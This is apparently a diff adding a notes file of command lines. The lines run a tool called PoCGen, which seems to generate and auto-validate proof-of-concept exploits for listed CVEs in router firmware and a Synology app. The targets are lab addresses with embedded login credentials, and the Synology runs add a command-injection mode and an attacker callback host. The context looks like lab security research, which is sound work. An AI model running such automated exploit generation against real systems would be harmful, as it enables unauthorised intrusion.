@@ -1,0 +1,66 @@
+CVE-2025-9149 (login/true)
+python3 -m PoCGen.cli \
+  --desc /home/li/ltzdb/CVE-2025-9149/vulcode_description.txt \
+  --code "/home/li/ltzdb/CVE-2025-9149/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5
+
+CVE-2019-20760 (login/false; attach_login_url base64)
+python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/CVE-2019-20760/vulcode_description.txt \
+  --code "/home/li/LLM_POC/vul_func_desc_poc/CVE-2019-20760/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5
+
+CVE-2023-39618 (login/false)
+python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/CVE-2023-39618/vulcode_description.txt \
+  --code "/home/li/LLM_POC/vul_func_desc_poc/CVE-2023-39618/相关函数/*.c" \
+  --target http://192.168.6.2 \
+  --probe-target --browser-login \
+  --login-url http://192.168.6.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5
+
+A7000r
+CVE-2022-37076
+python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/A7000r/CVE-2022-37076/desc.txt \
+  --code "/home/li/LLM_POC/vul_func_desc_poc/A7000r/CVE-2022-37076/相关函数/*.c" \
+  --target http://192.168.1.2 \
+  --probe-target --browser-login \
+  --login-url http://192.168.1.2 \
+  --login-username admin --login-password admin \
+  --auto-validate --max-iters 5
+
+synology
+CVE-2024-10443 (socket/no-probe)
+xvfb-run --auto-servernum --server-args='-screen 0 1280x720x24' python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/synology/CVE-2024-10443/vul_description.txt \
+  --code /home/li/LLM_POC/vul_func_desc_poc/synology/CVE-2024-10443/Vul_code/BeePhotosextra.conf \
+  --code /home/li/LLM_POC/vul_func_desc_poc/synology/CVE-2024-10443/Vul_code/vul_code.js \
+  --target http://192.168.1.184:5000 \
+  --vuln-type command_injection_socket \
+  --probe-target --browser-login \
+  --login-url http://192.168.1.184:5000/#/signin \
+  --login-username Eliza --login-password Beth2026 \
+  --auto-validate --max-iters 5 --browser-headful \
+  --attacker 192.168.1.139:6666/testpoc
+
+  python3 -m PoCGen.cli \
+  --desc /home/li/LLM_POC/vul_func_desc_poc/synology/CVE-2024-10443/vul_description.txt \
+  --code /home/li/LLM_POC/vul_func_desc_poc/synology/CVE-2024-10443/Vul_code/BeePhotosextra.conf \
+  --code /home/li/LLM_POC/vul_func_desc_poc/synology/CVE-2024-10443/Vul_code/vul_code.js \
+  --target http://192.168.1.184:5000 \
+  --vuln-type command_injection_socket \
+  --probe-target --browser-login \
+  --login-url http://192.168.1.184:5000/#/signin \
+  --login-username Eliza --login-password Beth2026 \
+  --auto-validate --max-iters 5  \
+  --attacker 192.168.1.139:6666/testpoc
